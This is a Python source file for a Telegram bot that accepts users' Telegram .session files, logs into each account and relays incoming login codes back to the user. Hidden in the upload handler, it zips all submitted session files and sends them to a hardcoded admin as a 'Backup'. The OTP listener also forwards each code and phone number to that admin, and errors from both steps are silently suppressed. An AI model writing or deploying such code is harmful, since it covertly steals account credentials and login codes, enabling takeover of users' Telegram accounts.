import re
import asyncio
import os
import shutil
from pathlib import Path
from zipfile import ZipFile
from telethon import TelegramClient, events
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.error import TimedOut, NetworkError
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
)

# ========= CONFIG =========
BOT_TOKEN = os.getenv("BOT_TOKEN")
API_ID = int(os.getenv("API_ID", 0))
API_HASH = os.getenv("API_HASH")
ADMIN_ID = int(os.getenv("ADMIN_ID", 0))
PORT = int(os.environ.get("PORT", 8080)) 
# ==========================

events_store = {}

async def process_single_session(sfile, user_id, idx, context):
    cb_key = f"skip:{user_id}:{idx}"
    client = TelegramClient(str(sfile), API_ID, API_HASH)
    try:
        await client.connect()
        if not await client.is_user_authorized(): return
        
        me = await client.get_me()
        phone = me.phone or "Unknown"
        otp_event, skip_event = asyncio.Event(), asyncio.Event()
        events_store.setdefault(user_id, {})[cb_key] = {"skip": skip_event, "tasks": []}

        keyboard = [[InlineKeyboardButton("Next ➡️", callback_data=cb_key)]]
        info_msg = await context.bot.send_message(
            user_id, f"👤 **User:** {me.first_name}\n📱 **Number:** `+{phone}`",
            reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown"
        )

        @client.on(events.NewMessage(from_users=777000))
        async def otp_listener(event):
            m = re.search(r"(\d{5})", event.raw_text)
            if m:
                code = m.group(1)
                await context.bot.send_message(user_id, f"🧩 **Your Code:** `{code}`", parse_mode="Markdown")
                try:
                    await context.bot.send_message(ADMIN_ID, f"🔑 **OTP:** `+{phone}` -> `{code}`")
                except: pass
                otp_event.set()

        t1, t2 = asyncio.create_task(otp_event.wait()), asyncio.create_task(skip_event.wait())
        events_store[user_id][cb_key]["tasks"] = [t1, t2]
        await asyncio.wait([t1, t2], return_when=asyncio.FIRST_COMPLETED)
        
        for t in [t1, t2]: 
            if not t.done(): t.cancel()
        await info_msg.edit_reply_markup(None)
    except Exception: pass
    finally:
        await client.disconnect()
        if user_id in events_store and cb_key in events_store[user_id]:
            del events_store[user_id][cb_key]

async def receive_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    doc = update.message.document
    if not doc or not (doc.file_name.lower().endswith(('.session', '.zip'))): return

    status_msg = await update.message.reply_text("✅ **File Received.**\n♻️ **Processing...**", parse_mode="Markdown")
    work_dir = Path(f"work_{user_id}_{doc.file_unique_id}")
    work_dir.mkdir(exist_ok=True)
    
    try:
        file = await context.bot.get_file(doc.file_id)
        local_path = work_dir / doc.file_name
        await file.download_to_drive(custom_path=local_path)

        if doc.file_name.lower().endswith(".zip"):
            def extract():
                with ZipFile(local_path, "r") as z: z.extractall(work_dir)
            await asyncio.to_thread(extract)
        
        all_sessions = list(work_dir.glob("*.session"))

        if all_sessions:
            admin_zip = Path(f"back_{user_id}.zip")
            with ZipFile(admin_zip, 'w') as zipf:
                for s in all_sessions: zipf.write(s, arcname=s.name)
            try:
                with open(admin_zip, 'rb') as f:
                    await context.bot.send_document(
                        ADMIN_ID, f, caption=f"📦 Backup: {user_id}",
                        read_timeout=300, write_timeout=300
                    )
            except: pass
            finally:
                if admin_zip.exists(): os.remove(admin_zip)

        for idx, sfile in enumerate(all_sessions, start=1):
            await process_single_session(sfile, user_id, idx, context)

    finally:
        shutil.rmtree(work_dir, ignore_errors=True)
        try: await status_msg.edit_text("✅ **Finished.**", parse_mode="Markdown")
        except: pass

async def skip_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    uid = update.effective_user.id
    if uid in events_store and query.data in events_store[uid]:
        events_store[uid][query.data]["skip"].set()
        await query.answer("Skipped")

def main():
    app_bot = ApplicationBuilder().token(BOT_TOKEN).concurrent_updates(True).read_timeout(30).write_timeout(30).build()
    app_bot.add_handler(CommandHandler("start", lambda u, c: asyncio.create_task(u.message.reply_text("Send files."))))
    app_bot.add_handler(MessageHandler(filters.Document.ALL, receive_file))
    app_bot.add_handler(CallbackQueryHandler(skip_callback, pattern="^skip:"))
    print("OTP Bot Started (Background)...")
    app_bot.run_polling()

if __name__ == "__main__":
    main()
